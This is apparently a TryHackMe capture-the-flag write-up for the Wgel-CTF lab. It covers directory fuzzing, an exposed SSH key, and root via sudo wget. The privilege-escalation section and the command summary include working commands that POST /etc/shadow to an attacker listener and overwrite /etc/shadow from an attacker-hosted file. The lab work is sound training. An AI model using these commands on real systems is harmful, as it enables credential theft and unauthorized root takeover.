# Wgel-CTF - TryHackMe

> **Kill Chain Summary**:
> Port Scanning (Ports 22, 80) -> Recursive Directory Brute-Force (`/sitemap/.ssh/`) -> Exposed RSA Private Key Extraction -> HTML Source Code Review (Developer Comment Revealing Username `jessie`) -> SSH Key Authentication -> Local Privilege Enumeration (`NOPASSWD: /usr/bin/wget`) -> Exfiltration and Modification of `/etc/shadow` -> Shadow File Overwrite via `sudo wget -O` -> Root Shell (`su root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Wgel-CTF |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu 16.04) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Directory Fuzzing, Exposed SSH Private Key, HTML Comment Analysis, Sudo Wget Shadow File Overwrite |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.128.190.102 10.128.190.102
```

**Open Ports:**
- **Port 22:** OpenSSH 7.2p2 (Ubuntu Linux)
- **Port 80:** Apache httpd 2.4.18

### 1.2 Web Directory Enumeration

An initial directory brute-force scan with Gobuster discovered the `/sitemap` directory:

```bash
gobuster dir -u http://10.128.190.102/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/sitemap             (Status: 301) [--> http://10.128.190.102/sitemap/]
```

Performing a recursive Gobuster scan on `/sitemap`:

```bash
gobuster dir -u http://10.128.190.102/sitemap/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/.ssh                (Status: 301) [--> http://10.128.190.102/sitemap/.ssh/]
```

Navigating to `http://10.128.190.102/sitemap/.ssh/` revealed an exposed OpenSSH RSA private key (`id_rsa`).

Download and save the key locally:

```bash
curl -s http://10.128.190.102/sitemap/.ssh/id_rsa -o id_rsa
chmod 600 id_rsa
```

### 1.3 Username Identification

To use the private key for SSH authentication, a matching username was required. Reviewing the HTML source code of the default Apache root page (`http://10.128.190.102/`) exposed an internal developer comment:

```html
<!-- Jessie don't forget to update the website -->
```

Target username confirmed: **`jessie`**.

---

## 2. Initial Access

### 2.1 SSH Authentication

Authenticate to the host using the extracted private key:

```bash
ssh -i id_rsa jessie@10.128.190.102
```

```bash
jessie@CorpOne:~$ id
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie)
```

Retrieve the user flag located in the user's Documents directory:

```bash
cat /home/jessie/Documents/user_flag.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration: Sudo Privileges

Checking sudo privileges for user `jessie`:

```bash
sudo -l
```

```text
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (root) NOPASSWD: /usr/bin/wget
```

The user is permitted to run `/usr/bin/wget` as `root` without a password.

### 3.2 Exploitation: Arbitrary File Overwrite via Wget

> [!NOTE] Concept: Sudo Wget Arbitrary Read and Write
> While `wget` is primarily a download utility, its flags allow both reading and writing privileged files:
> - **Arbitrary File Read:** The `--post-file` flag sends the contents of any readable file in an HTTP POST body to a remote listener.
> - **Arbitrary File Write:** The `-O` (output document) flag allows writing downloaded data directly into any root-owned file, including `/etc/shadow`, `/etc/passwd`, or `/etc/cron.d/`.

#### Step 1: Exfiltrate shadow File
On the Kali attack machine, start a Netcat listener:

```bash
nc -lvnp 4444
```

On the target, exfiltrate the current `/etc/shadow` file:

```bash
sudo /usr/bin/wget --post-file=/etc/shadow http://10.10.14.5:4444
```

The listener captures the complete `/etc/shadow` contents:

```text
root:$6$vQ9...:18195:0:99999:7:::
daemon:*:17953:0:99999:7:::
...
jessie:$6$N4...:18195:0:99999:7:::
```

#### Step 2: Generate a Known Root Password Hash
On the attack machine, generate a SHA-512 crypt hash for password `password`:

```bash
openssl passwd -6 -salt 'salt' 'password'
```

```text
$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.
```

Create a new file named `shadow.txt` locally, replacing root's existing hash line with the generated hash:

```text
root:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:18195:0:99999:7:::
daemon:*:17953:0:99999:7:::
...
```

#### Step 3: Overwrite shadow File on Target
Host `shadow.txt` from the attack machine:

```bash
python3 -m http.server 8000
```

On the target host, download the modified shadow file directly over `/etc/shadow`:

```bash
sudo /usr/bin/wget http://10.10.14.5:8000/shadow.txt -O /etc/shadow
```

#### Step 4: Switch to Root Context
Authenticate as root using the defined password (`password`):

```bash
su root
```

Verify privileges:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Recursive Directory Fuzzing
gobuster dir -u http://<TARGET_IP>/<SUBDIR>/ -w /usr/share/wordlists/dirb/common.txt

# Sudo Wget Exfiltrate File Contents via POST
sudo /usr/bin/wget --post-file=/etc/shadow http://<KALI_IP>:<PORT>

# Generate SHA-512 Linux Password Hash
openssl passwd -6 -salt 'salt' '<NEW_PASSWORD>'

# Sudo Wget Overwrite Privileged System File
sudo /usr/bin/wget http://<KALI_IP>:<PORT>/shadow.txt -O /etc/shadow
```

---

## 5. Key Takeaways and Lessons Learned

1. **Recursive Web Fuzzing:** Sensitive staging directories (e.g., hidden `.ssh/` repositories) are often nested under secondary folders like `/sitemap` or `/backup`. Fuzzing discovered paths systematically uncovers exposed assets.
2. **Source Code Commentary:** Static HTML files, including default Apache installation pages, must always be inspected. Comments left during development frequently disclose valid usernames, internal domains, or debugging parameters.
3. **Wget Privilege Escalation Mechanics:** Rather than attempting dictionary attacks against exfiltrated password hashes, overwriting `/etc/shadow` with a known hash using `wget -O` provides immediate, deterministic root access.

---

#tryhackme #linux #easy #directory-fuzzing #ssh-key #html-comments #sudo #wget #etc-shadow #privesc
